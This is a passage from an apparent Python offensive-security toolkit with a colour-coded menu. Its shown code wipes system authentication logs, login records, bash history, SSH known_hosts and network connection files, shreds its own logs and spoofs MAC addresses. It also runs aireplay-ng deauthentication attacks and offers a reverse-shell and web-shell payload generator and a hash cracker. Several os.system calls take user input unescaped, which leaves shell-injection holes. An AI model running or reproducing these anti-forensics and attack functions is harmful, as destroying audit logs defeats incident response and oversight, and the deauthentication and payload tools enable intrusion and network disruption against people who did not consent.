            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/kern.log',
            '/var/log/messages',
            '/var/log/secure',
            '/var/log/wtmp',
            '/var/log/btmp',
            '/var/log/lastlog'
        ]
        
        for log in logs:
            try:
                if os.path.exists(log):
                    os.system(f'echo "" > {log}')
                    print(f"{Colors.GREEN}[+] Cleared: {log}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[!] Failed to clear {log}: {e}{Colors.RESET}")
        
        logger.log("System logs cleared", "SUCCESS")
        return True
    
    @staticmethod
    def clear_dns_cache():
        """Clear DNS cache"""
        logger.log("Clearing DNS cache", "INFO")
        
        try:
            # systemd-resolved
            os.system('sudo systemd-resolve --flush-caches 2>/dev/null')
            
            # nscd
            os.system('sudo /etc/init.d/nscd restart 2>/dev/null')
            
            # dnsmasq
            os.system('sudo /etc/init.d/dnsmasq restart 2>/dev/null')
            
            print(f"{Colors.GREEN}[+] DNS cache cleared{Colors.RESET}")
            logger.log("DNS cache cleared", "SUCCESS")
            return True
        except Exception as e:
            logger.log(f"Error clearing DNS cache: {e}", "ERROR")
            return False
    
    @staticmethod
    def clear_browser_data():
        """Clear browser data and cache"""
        logger.log("Clearing browser data", "INFO")
        
        browsers = {
            'Firefox': '~/.mozilla/firefox',
            'Chrome': '~/.config/google-chrome',
            'Chromium': '~/.config/chromium',
            'Brave': '~/.config/BraveSoftware'
        }
        
        for browser, path in browsers.items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                try:
                    # Clear cache
                    cache_path = os.path.join(expanded_path, 'Cache')
                    if os.path.exists(cache_path):
                        os.system(f'rm -rf {cache_path}/*')
                    
                    # Clear cookies
                    cookies_path = os.path.join(expanded_path, 'Cookies')
                    if os.path.exists(cookies_path):
                        os.system(f'rm -f {cookies_path}')
                    
                    print(f"{Colors.GREEN}[+] Cleared {browser} data{Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.RED}[!] Error clearing {browser}: {e}{Colors.RESET}")
        
        logger.log("Browser data cleared", "SUCCESS")
        return True
    
    @staticmethod
    def shred_file(filepath, passes=3):
        """Securely delete file with multiple overwrites"""
        logger.log(f"Shredding file: {filepath}", "INFO")
        
        if not os.path.exists(filepath):
            print(f"{Colors.RED}[!] File not found{Colors.RESET}")
            return False
        
        try:
            os.system(f'shred -vfz -n {passes} {filepath}')
            print(f"{Colors.GREEN}[+] File securely deleted{Colors.RESET}")
            logger.log(f"File shredded: {filepath}", "SUCCESS")
            return True
        except Exception as e:
            logger.log(f"Error shredding file: {e}", "ERROR")
            return False
    
    @staticmethod
    def clear_tmp_files():
        """Clear temporary files"""
        logger.log("Clearing temporary files", "INFO")
        
        tmp_dirs = ['/tmp', '/var/tmp', '~/.cache']
        
        for tmp in tmp_dirs:
            expanded = os.path.expanduser(tmp)
            try:
                if os.path.exists(expanded):
                    # Don't delete the directory, just contents
                    os.system(f'find {expanded} -type f -delete 2>/dev/null')
                    print(f"{Colors.GREEN}[+] Cleared: {expanded}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error clearing {expanded}: {e}{Colors.RESET}")
        
        logger.log("Temporary files cleared", "SUCCESS")
        return True
    
    @staticmethod
    def disable_swap():
        """Disable swap to prevent sensitive data storage"""
        logger.log("Disabling swap", "WARNING")
        
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!] Root privileges required{Colors.RESET}")
            return False
        
        try:
            os.system('swapoff -a')
            print(f"{Colors.GREEN}[+] Swap disabled{Colors.RESET}")
            logger.log("Swap disabled", "SUCCESS")
            return True
        except Exception as e:
            logger.log(f"Error disabling swap: {e}", "ERROR")
            return False
    
    @staticmethod
    def clear_recent_files():
        """Clear recently accessed files list"""
        logger.log("Clearing recent files", "INFO")
        
        recent_files = [
            '~/.local/share/recently-used.xbel',
            '~/.recently-used',
            '~/.gtk-bookmarks'
        ]
        
        for recent in recent_files:
            expanded = os.path.expanduser(recent)
            if os.path.exists(expanded):
                try:
                    os.system(f'echo "" > {expanded}')
                    print(f"{Colors.GREEN}[+] Cleared: {recent}{Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
        
        logger.log("Recent files cleared", "SUCCESS")
        return True
    
    @staticmethod
    def clear_network_connections():
        """Clear network connection history"""
        logger.log("Clearing network connections", "INFO")
        
        try:
            # Clear NetworkManager connections
            nm_path = '/etc/NetworkManager/system-connections/'
            if os.path.exists(nm_path) and os.geteuid() == 0:
                os.system(f'rm -f {nm_path}*')
                print(f"{Colors.GREEN}[+] NetworkManager connections cleared{Colors.RESET}")
            
            # Clear known hosts
            known_hosts = os.path.expanduser('~/.ssh/known_hosts')
            if os.path.exists(known_hosts):
                os.system(f'echo "" > {known_hosts}')
                print(f"{Colors.GREEN}[+] SSH known hosts cleared{Colors.RESET}")
            
            logger.log("Network connections cleared", "SUCCESS")
            return True
        except Exception as e:
            logger.log(f"Error clearing network connections: {e}", "ERROR")
            return False
    
    @staticmethod
    def anonymize_mac():
        """Change MAC address (requires root)"""
        logger.log("Changing MAC address", "WARNING")
        
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!] Root privileges required{Colors.RESET}")
            return False
        
        interface = input(f"{Colors.CYAN}Enter interface (e.g., eth0, wlan0): {Colors.RESET}")
        
        try:
            # Bring interface down
            os.system(f'ip link set {interface} down')
            
            # Change MAC address
            import random
            new_mac = ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])
            os.system(f'ip link set {interface} address {new_mac}')
            
            # Bring interface up
            os.system(f'ip link set {interface} up')
            
            print(f"{Colors.GREEN}[+] MAC address changed to: {new_mac}{Colors.RESET}")
            logger.log(f"MAC address changed on {interface}", "SUCCESS")
            return True
        except Exception as e:
            logger.log(f"Error changing MAC address: {e}", "ERROR")
            return False
    
    @staticmethod
    def full_cleanup():
        """Perform comprehensive cleanup"""
        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}FULL DIGITAL FOOTPRINT CLEANUP{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
        
        print(f"{Colors.RED}[!] WARNING: This will clear logs, history, and cache files{Colors.RESET}")
        confirm = input(f"{Colors.CYAN}Continue? (yes/no): {Colors.RESET}")
        
        if confirm.lower() != 'yes':
            print(f"{Colors.YELLOW}[!] Cleanup cancelled{Colors.RESET}")
            return False
        
        print(f"\n{Colors.CYAN}[1/9] Clearing bash history...{Colors.RESET}")
        OPSECTools.clear_bash_history()
        
        print(f"\n{Colors.CYAN}[2/9] Clearing DNS cache...{Colors.RESET}")
        OPSECTools.clear_dns_cache()
        
        print(f"\n{Colors.CYAN}[3/9] Clearing browser data...{Colors.RESET}")
        OPSECTools.clear_browser_data()
        
        print(f"\n{Colors.CYAN}[4/9] Clearing temporary files...{Colors.RESET}")
        OPSECTools.clear_tmp_files()
        
        print(f"\n{Colors.CYAN}[5/9] Clearing recent files...{Colors.RESET}")
        OPSECTools.clear_recent_files()
        
        print(f"\n{Colors.CYAN}[6/9] Clearing network connections...{Colors.RESET}")
        OPSECTools.clear_network_connections()
        
        if os.geteuid() == 0:
            print(f"\n{Colors.CYAN}[7/9] Clearing system logs...{Colors.RESET}")
            OPSECTools.clear_system_logs()
            
            print(f"\n{Colors.CYAN}[8/9] Disabling swap...{Colors.RESET}")
            OPSECTools.disable_swap()
        else:
            print(f"\n{Colors.YELLOW}[!] Skipping root-only operations (7-8){Colors.RESET}")
        
        print(f"\n{Colors.CYAN}[9/9] Shredding application logs...{Colors.RESET}")
        if os.path.exists(logger.session_file):
            OPSECTools.shred_file(logger.session_file)
        
        print(f"\n{Colors.GREEN}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}[+] CLEANUP COMPLETE{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*70}{Colors.RESET}\n")
        
        logger.log("Full cleanup completed", "SUCCESS")
        return True
    
    @staticmethod
    def check_for_traces():
        """Check system for remaining traces"""
        print(f"\n{Colors.CYAN}Checking for digital traces...{Colors.RESET}\n")
        
        traces = []
        
        # Check bash history
        bash_history = os.path.expanduser('~/.bash_history')
        if os.path.exists(bash_history):
            size = os.path.getsize(bash_history)
            if size > 0:
                traces.append(('Bash History', f"{size} bytes", 'MEDIUM'))
                print(f"{Colors.YELLOW}[!] Bash history contains data: {size} bytes{Colors.RESET}")
        
        # Check logs
        if os.geteuid() == 0:
            log_files = ['/var/log/auth.log', '/var/log/syslog']
            for log in log_files:
                if os.path.exists(log):
                    size = os.path.getsize(log)
                    if size > 1000:  # More than 1KB
                        traces.append((log, f"{size} bytes", 'HIGH'))
                        print(f"{Colors.RED}[!] {log} has data: {size} bytes{Colors.RESET}")
        
        # Check tmp files
        tmp_files = subprocess.run(['find', '/tmp', '-type', 'f'], capture_output=True, text=True)
        tmp_count = len(tmp_files.stdout.split('\n'))
        if tmp_count > 10:
            traces.append(('Temp Files', f"{tmp_count} files", 'LOW'))
            print(f"{Colors.YELLOW}[!] {tmp_count} temporary files found{Colors.RESET}")
        
        # Check browser cache
        cache_paths = [
            '~/.mozilla/firefox',
            '~/.config/google-chrome',
            '~/.config/chromium'
        ]
        
        for cache in cache_paths:
            expanded = os.path.expanduser(cache)
            if os.path.exists(expanded):
                size = subprocess.run(['du', '-sh', expanded], capture_output=True, text=True)
                traces.append((cache, size.stdout.split()[0], 'MEDIUM'))
                print(f"{Colors.YELLOW}[!] Browser cache: {cache} - {size.stdout.split()[0]}{Colors.RESET}")
        
        if not traces:
            print(f"{Colors.GREEN}[+] No significant traces found{Colors.RESET}")
        else:
            print(f"\n{Colors.CYAN}Summary: {len(traces)} traces found{Colors.RESET}")
        
        return traces

# ==================== WIRELESS TOOLS ====================
class WirelessTools:
    @staticmethod
    def scan_wifi():
        """Scan for WiFi networks"""
        logger.log("Scanning WiFi networks", "INFO")
        
        try:
            result = subprocess.run(
                ['nmcli', 'dev', 'wifi', 'list'],
                capture_output=True,
                text=True
            )
            print(result.stdout)
            return result.stdout
            
        except FileNotFoundError:
            logger.log("nmcli not found", "ERROR")
            return None
    
    @staticmethod
    def monitor_mode(interface):
        """Enable monitor mode"""
        try:
            subprocess.run(['airmon-ng', 'start', interface], check=True)
            logger.log(f"Monitor mode enabled on {interface}", "SUCCESS")
            return True
        except:
            logger.log("Failed to enable monitor mode", "ERROR")
            return False
    
    @staticmethod
    def deauth_attack(interface, bssid, client=None):
        """Deauthentication attack (Educational purposes only)"""
        logger.log("WARNING: Deauth attacks are illegal without permission", "WARNING")
        
        if client:
            cmd = ['aireplay-ng', '--deauth', '10', '-a', bssid, '-c', client, interface]
        else:
            cmd = ['aireplay-ng', '--deauth', '10', '-a', bssid, interface]
        
        try:
            subprocess.run(cmd)
        except Exception as e:
            logger.log(f"Deauth error: {e}", "ERROR")

# ==================== REPORT GENERATOR ====================
class ReportGenerator:
    @staticmethod
    def generate_html_report(target, scan_data):
        """Generate comprehensive HTML report"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{CONFIG['reports_dir']}/report_{target.replace('/', '_')}_{timestamp}.html"
        
        html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Assessment Report - {target}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            overflow: hidden;
        }}
        .header {{
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }}
        .header h1 {{ font-size: 2.5em; margin-bottom: 10px; }}
        .header p {{ font-size: 1.2em; opacity: 0.9; }}
        .summary {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 30px;
            background: #f8f9fa;
        }}
        .summary-card {{
            background: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }}
        .summary-card:hover {{ transform: translateY(-5px); }}
        .summary-card h3 {{ color: #666; margin-bottom: 10px; }}
        .summary-card .number {{ 
            font-size: 3em;
            font-weight: bold;
            margin: 10px 0;
        }}
        .critical {{ color: #e74c3c; }}
        .high {{ color: #e67e22; }}
        .medium {{ color: #f39c12; }}
        .low {{ color: #3498db; }}
        .info {{ color: #95a5a6; }}
        .section {{
            padding: 30px;
            border-bottom: 1px solid #eee;
        }}
        .section h2 {{
            color: #2c3e50;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 3px solid #3498db;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background: #34495e;
            color: white;
            font-weight: 600;
        }}
        tr:hover {{ background: #f8f9fa; }}
        .vuln-item {{
            background: #f8f9fa;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border-left: 4px solid #3498db;
        }}
        .badge {{
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.9em;
            font-weight: bold;
            color: white;
        }}
        .badge.critical {{ background: #e74c3c; }}
        .badge.high {{ background: #e67e22; }}
        .badge.medium {{ background: #f39c12; }}
        .badge.low {{ background: #3498db; }}
        .footer {{
            background: #2c3e50;
            color: white;
            padding: 20px;
            text-align: center;
        }}
        code {{
            background: #2c3e50;
            color: #fff;
            padding: 2px 8px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        }}
        pre {{
            background: #2c3e50;
            color: #fff;
            padding: 15px;
            border-radius: 8px;
            overflow-x: auto;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Security Assessment Report</h1>
            <p>Target: {target}</p>
            <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="summary">
            <div class="summary-card">
                <h3>Total Issues</h3>
                <div class="number critical">{len(scan_data.get('vulnerabilities', []))}</div>
            </div>
            <div class="summary-card">
                <h3>Open Ports</h3>
                <div class="number info">{len(scan_data.get('ports', []))}</div>
            </div>
            <div class="summary-card">
                <h3>Services</h3>
                <div class="number info">{len(set([p.get('service', '') for p in scan_data.get('ports', [])]))}</div>
            </div>
            <div class="summary-card">
                <h3>Risk Level</h3>
                <div class="number high">HIGH</div>
            </div>
        </div>
        
        <div class="section">
            <h2>📊 Executive Summary</h2>
            <p>This report contains the results of a comprehensive security assessment performed on <strong>{target}</strong>.</p>
            <p>The assessment identified <strong>{len(scan_data.get('vulnerabilities', []))}</strong> potential security issues that require attention.</p>
        </div>
        
        <div class="section">
            <h2>🔍 Vulnerability Findings</h2>
            {''.join([f'''
            <div class="vuln-item">
                <span class="badge {v.get('severity', 'low').lower()}">{v.get('severity', 'LOW')}</span>
                <h3>{v.get('type', 'Unknown')}</h3>
                <p><strong>Description:</strong> {v.get('description', 'No description')}</p>
                {f"<p><strong>Payload:</strong> <code>{v.get('payload', '')}</code></p>" if v.get('payload') else ''}
            </div>
            ''' for v in scan_data.get('vulnerabilities', [])])}
        </div>
        
        <div class="section">
            <h2>🔌 Open Ports & Services</h2>
            <table>
                <thead>
                    <tr>
                        <th>Port</th>
                        <th>Service</th>
                        <th>Version</th>
                        <th>Banner</th>
                    </tr>
                </thead>
                <tbody>
                    {''.join([f'''
                    <tr>
                        <td>{p.get('port', 'N/A')}</td>
                        <td>{p.get('service', 'unknown')}</td>
                        <td>{p.get('version', 'N/A')}</td>
                        <td><code>{p.get('banner', 'N/A')[:50] if p.get('banner') else 'N/A'}</code></td>
                    </tr>
                    ''' for p in scan_data.get('ports', [])])}
                </tbody>
            </table>
        </div>
        
        <div class="section">
            <h2>💡 Recommendations</h2>
            <ul style="line-height: 2;">
                <li>Address all CRITICAL and HIGH severity vulnerabilities immediately</li>
                <li>Implement proper input validation and sanitization</li>
                <li>Enable security headers (CSP, X-Frame-Options, etc.)</li>
                <li>Keep all software and services up to date</li>
                <li>Implement proper access controls and authentication</li>
                <li>Regular security audits and penetration testing</li>
                <li>Enable logging and monitoring for security events</li>
            </ul>
        </div>
        
        <div class="footer">
            <p>Generated by Parrot OS Advanced Cybersecurity Suite v2.0</p>
            <p>⚠️ This report is confidential and for authorized use only</p>
        </div>
    </div>
</body>
</html>
        """
        
        with open(filename, 'w') as f:
            f.write(html)
        
        logger.log(f"HTML report generated: {filename}", "SUCCESS")
        return filename
    
    @staticmethod
    def generate_json_report(target, scan_data):
        """Generate JSON report"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{CONFIG['reports_dir']}/report_{target.replace('/', '_')}_{timestamp}.json"
        
        report = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'scan_data': scan_data
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=4)
        
        logger.log(f"JSON report generated: {filename}", "SUCCESS")
        return filename

# ==================== MAIN MENU ====================
def automation_menu():
    """Automated scanning menu"""
    clear()
    print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
    print(f"{Colors.BOLD}AUTOMATED SCAN{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
    
    target = input(f"{Colors.CYAN}Enter target (IP/domain/URL): {Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}[*] Starting automated scan...{Colors.RESET}\n")
    
    scan_data = {
        'target': target,
        'ports': [],
        'vulnerabilities': [],
        'subdomains': []
    }
    
    # Port scan
    if validate_ip(target) or not target.startswith('http'):
        print(f"{Colors.CYAN}[1/4] Port Scanning...{Colors.RESET}")
        scanner = AdvancedPortScanner(target)
        scan_data['ports'] = scanner.scan(common_only=True)
    
    # Web vuln scan
    if target.startswith('http') or not validate_ip(target):
        print(f"\n{Colors.CYAN}[2/4] Web Vulnerability Scanning...{Colors.RESET}")
        web_scanner = WebVulnScanner(target)
        scan_data['vulnerabilities'] = web_scanner.full_scan()
    
    # Subdomain enum
    if not validate_ip(target) and not target.startswith('http'):
        print(f"\n{Colors.CYAN}[3/4] Subdomain Enumeration...{Colors.RESET}")
        scan_data['subdomains'] = NetworkRecon.subdomain_enum(target)
    
    # Generate report
    print(f"\n{Colors.CYAN}[4/4] Generating Report...{Colors.RESET}")
    ReportGenerator.generate_html_report(target, scan_data)
    ReportGenerator.generate_json_report(target, scan_data)
    
    print(f"\n{Colors.GREEN}[+] Automated scan completed!{Colors.RESET}")

def main_menu():
    while True:
        clear()
        banner()
        
        print(f"{Colors.BOLD}{Colors.CYAN}╔═══ RECONNAISSANCE ═══╗{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET} 1.  Advanced Port Scanner")
        print(f"{Colors.CYAN}║{Colors.RESET} 2.  Network Information")
        print(f"{Colors.CYAN}║{Colors.RESET} 3.  Subdomain Enumeration")
        print(f"{Colors.CYAN}║{Colors.RESET} 4.  DNS Lookup")
        print(f"{Colors.CYAN}║{Colors.RESET} 5.  Ping Sweep")
        print(f"{Colors.CYAN}╚══════════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}╔═══ WEB SECURITY ═══╗{Colors.RESET}")
        print(f"{Colors.MAGENTA}║{Colors.RESET} 6.  Web Vulnerability Scanner")
        print(f"{Colors.MAGENTA}║{Colors.RESET} 7.  SQL Injection Tester")
        print(f"{Colors.MAGENTA}║{Colors.RESET} 8.  XSS Scanner")
        print(f"{Colors.MAGENTA}║{Colors.RESET} 9.  Directory Scanner")
        print(f"{Colors.MAGENTA}╚════════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.YELLOW}╔═══ EXPLOITATION ═══╗{Colors.RESET}")
        print(f"{Colors.YELLOW}║{Colors.RESET} 10. Search Exploit-DB")
        print(f"{Colors.YELLOW}║{Colors.RESET} 11. Search CVE Database")
        print(f"{Colors.YELLOW}║{Colors.RESET} 12. Metasploit Search")
        print(f"{Colors.YELLOW}║{Colors.RESET} 13. Payload Generator")
        print(f"{Colors.YELLOW}╚════════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}╔═══ PASSWORD TOOLS ═══╗{Colors.RESET}")
        print(f"{Colors.GREEN}║{Colors.RESET} 14. Generate Wordlist")
        print(f"{Colors.GREEN}║{Colors.RESET} 15. Hash Generator")
        print(f"{Colors.GREEN}║{Colors.RESET} 16. Hash Cracker")
        print(f"{Colors.GREEN}║{Colors.RESET} 17. Password Generator")
        print(f"{Colors.GREEN}╚══════════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.BLUE}╔═══ WIRELESS ═══╗{Colors.RESET}")
        print(f"{Colors.BLUE}║{Colors.RESET} 18. WiFi Scanner")
        print(f"{Colors.BLUE}║{Colors.RESET} 19. Monitor Mode")
        print(f"{Colors.BLUE}╚════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.WHITE}╔═══ AUTOMATION & REPORTS ═══╗{Colors.RESET}")
        print(f"{Colors.WHITE}║{Colors.RESET} 20. Automated Full Scan")
        print(f"{Colors.WHITE}║{Colors.RESET} 21. Generate Report")
        print(f"{Colors.WHITE}║{Colors.RESET} 22. View Scan History")
        print(f"{Colors.WHITE}║{Colors.RESET} 23. View Vulnerabilities")
        print(f"{Colors.WHITE}╚════════════════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.WHITE}╔═══ OPSEC & ANTI-FORENSICS ═══╗{Colors.RESET}")
        print(f"{Colors.WHITE}║{Colors.RESET} 27. Full Footprint Cleanup")
        print(f"{Colors.WHITE}║{Colors.RESET} 28. Clear Bash History")
        print(f"{Colors.WHITE}║{Colors.RESET} 29. Clear System Logs")
        print(f"{Colors.WHITE}║{Colors.RESET} 30. Clear Browser Data")
        print(f"{Colors.WHITE}║{Colors.RESET} 31. Clear DNS Cache")
        print(f"{Colors.WHITE}║{Colors.RESET} 32. Shred File")
        print(f"{Colors.WHITE}║{Colors.RESET} 33. Change MAC Address")
        print(f"{Colors.WHITE}║{Colors.RESET} 34. Check for Traces")
        print(f"{Colors.WHITE}╚═══════════════════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.WHITE}╔═══ SYSTEM ═══╗{Colors.RESET}")
        print(f"{Colors.WHITE}║{Colors.RESET} 24. Update Tools")
        print(f"{Colors.WHITE}║{Colors.RESET} 25. View Logs")
        print(f"{Colors.WHITE}║{Colors.RESET} 26. Configuration")
        print(f"{Colors.WHITE}╚═══════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.RED}0. Exit{Colors.RESET}")
        
        try:
            choice = input(f"\n{Colors.CYAN}┌─[Select Option]")
            choice = input(f"{Colors.CYAN}└──╼ ${Colors.RESET} ")
            
            if choice == '1':
                target = input(f"{Colors.CYAN}Target IP/hostname: {Colors.RESET}")
                common = input(f"{Colors.CYAN}Scan common ports only? (y/n): {Colors.RESET}").lower() == 'y'
                scanner = AdvancedPortScanner(target)
                scanner.scan(common_only=common)
                
            elif choice == '2':
                info = NetworkRecon.get_network_info()
                print(f"\n{Colors.GREEN}[+] Hostname: {info['hostname']}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Local IP: {info['local_ip']}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Public IP: {info['public_ip']}{Colors.RESET}")
                
            elif choice == '3':
                domain = input(f"{Colors.CYAN}Domain to enumerate: {Colors.RESET}")
                NetworkRecon.subdomain_enum(domain)
                
            elif choice == '4':
                target = input(f"{Colors.CYAN}Domain for DNS lookup: {Colors.RESET}")
                results = NetworkRecon.dns_lookup(target)
                print(f"\n{Colors.GREEN}[+] DNS Records:{Colors.RESET}")
                for record_type, values in results.items():
                    print(f"\n{Colors.CYAN}{record_type}:{Colors.RESET}")
                    for value in values:
                        print(f"  - {value}")
                
            elif choice == '5':
                network = input(f"{Colors.CYAN}Network (e.g., 192.168.1.0/24): {Colors.RESET}")
                NetworkRecon.ping_sweep(network)
                
            elif choice == '6':
                url = input(f"{Colors.CYAN}Target URL: {Colors.RESET}")
                scanner = WebVulnScanner(url)
                scanner.full_scan()
                
            elif choice == '7':
                url = input(f"{Colors.CYAN}Target URL: {Colors.RESET}")
                scanner = WebVulnScanner(url)
                scanner.test_sql_injection()
                
            elif choice == '8':
                url = input(f"{Colors.CYAN}Target URL: {Colors.RESET}")
                scanner = WebVulnScanner(url)
                scanner.test_xss()
                
            elif choice == '9':
                url = input(f"{Colors.CYAN}Target URL: {Colors.RESET}")
                scanner = WebVulnScanner(url)
                scanner.scan_directories()
                
            elif choice == '10':
                query = input(f"{Colors.CYAN}Search query: {Colors.RESET}")
                ExploitTools.search_exploitdb(query)
                
            elif choice == '11':
                query = input(f"{Colors.CYAN}Search CVE: {Colors.RESET}")
                ExploitTools.search_cve(query)
                
            elif choice == '12':
                query = input(f"{Colors.CYAN}Search Metasploit: {Colors.RESET}")
                ExploitTools.metasploit_search(query)
                
            elif choice == '13':
                print(f"\n{Colors.CYAN}Payload Generator{Colors.RESET}\n")
                print("1. Reverse Shell")
                print("2. Web Shells")
                print("3. SQL Injection Payloads")
                print("4. XSS Payloads")
                
                ptype = input(f"\n{Colors.CYAN}Select type: {Colors.RESET}")
                
                if ptype == '1':
                    lhost = input(f"{Colors.CYAN}LHOST: {Colors.RESET}")
                    lport = input(f"{Colors.CYAN}LPORT: {Colors.RESET}")
                    
                    print(f"\n{Colors.YELLOW}Available shells:{Colors.RESET}")
                    shells = ['bash', 'python', 'python3', 'nc', 'nc_alt', 'php', 'ruby', 'perl', 'powershell', 'java']
                    for i, shell in enumerate(shells, 1):
                        print(f"{i}. {shell}")
                    
                    shell_choice = input(f"\n{Colors.CYAN}Select shell: {Colors.RESET}")
                    shell_type = shells[int(shell_choice) - 1] if shell_choice.isdigit() else 'bash'
                    
                    payload = PayloadGenerator.reverse_shell(lhost, lport, shell_type)
                    print(f"\n{Colors.GREEN}[+] Payload:{Colors.RESET}\n")
                    print(f"{Colors.WHITE}{payload}{Colors.RESET}\n")
                    
                    encode = input(f"{Colors.CYAN}Encode? (base64/url/hex/n): {Colors.RESET}")
                    if encode in ['base64', 'url', 'hex']:
                        encoded = PayloadGenerator.encode_payload(payload, encode)
                        print(f"\n{Colors.GREEN}[+] Encoded ({encode}):{Colors.RESET}\n")
                        print(f"{Colors.WHITE}{encoded}{Colors.RESET}\n")
                
                elif ptype == '2':
                    shells = PayloadGenerator.web_shells()
                    print(f"\n{Colors.GREEN}[+] Web Shells:{Colors.RESET}\n")
                    for name, code in shells.items():
                        print(f"{Colors.CYAN}{name}:{Colors.RESET}")
                        print(f"{Colors.WHITE}{code}{Colors.RESET}\n")
                
                elif ptype == '3':
                    payloads = PayloadGenerator.sql_injection()
                    print(f"\n{Colors.GREEN}[+] SQL Injection Payloads:{Colors.RESET}\n")
                    for category, payload_list in payloads.items():
                        print(f"{Colors.CYAN}{category}:{Colors.RESET}")
                        for p in payload_list:
                            print(f"  - {p}")
                        print()
                
                elif ptype == '4':
                    payloads = PayloadGenerator.xss_payloads()
                    print(f"\n{Colors.GREEN}[+] XSS Payloads:{Colors.RESET}\n")
                    for i, p in enumerate(payloads, 1):
                        print(f"{i:2d}. {p}")
                
            elif choice == '14':
                base = input(f"{Colors.CYAN}Base word: {Colors.RESET}")
                filename = input(f"{Colors.CYAN}Output filename (press Enter for default): {Colors.RESET}")
                filename = filename if filename else None
                PasswordTools.generate_wordlist(base, filename)
                
            elif choice == '15':
                text = input(f"{Colors.CYAN}Text to hash: {Colors.RESET}")
                print(f"\n{Colors.GREEN}[+] Hashes:{Colors.RESET}\n")
                algorithms = ['md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']
                for algo in algorithms:
                    hash_value = PasswordTools.hash_text(text, algo)
                    print(f"{Colors.CYAN}{algo:10s}{Colors.RESET} {hash_value}")
                
            elif choice == '16':
                hash_value = input(f"{Colors.CYAN}Hash to crack: {Colors.RESET}")
                hash_type = input(f"{Colors.CYAN}Hash type (md5/sha1/sha256): {Colors.RESET}") or 'md5'
                wordlist = input(f"{Colors.CYAN}Wordlist path (Enter for default): {Colors.RESET}")
                
                result = PasswordTools.crack_hash(hash_value, hash_type, wordlist if wordlist else None)
                if result:
                    print(f"\n{Colors.GREEN}[+] Password found: {result}{Colors.RESET}")
                else:
                    print(f"\n{Colors.RED}[!] Password not found{Colors.RESET}")
                
            elif choice == '17':
                length = input(f"{Colors.CYAN}Password length (default 16): {Colors.RESET}")
                length = int(length) if length.isdigit() else 16
                
                count = input(f"{Colors.CYAN}Number of passwords (default 10): {Colors.RESET}")
                count = int(count) if count.isdigit() else 10
                
                symbols = input(f"{Colors.CYAN}Include symbols? (y/n): {Colors.RESET}").lower() != 'n'
                
                print(f"\n{Colors.GREEN}[+] Generated Passwords:{Colors.RESET}\n")
                for i in range(count):
                    pwd = PasswordTools.generate_password(length, symbols)
                    print(f"{i+1:2d}. {Colors.WHITE}{pwd}{Colors.RESET}")
                
            elif choice == '18':
                WirelessTools.scan_wifi()
                
            elif choice == '19':
                interface = input(f"{Colors.CYAN}Wireless interface (e.g., wlan0): {Colors.RESET}")
                WirelessTools.monitor_mode(interface)
                
            elif choice == '20':
                automation_menu()
                
            elif choice == '21':
                target = input(f"{Colors.CYAN}Target: {Colors.RESET}")
                
                # Get scan data from database
                scans = db.get_scan_history(target)
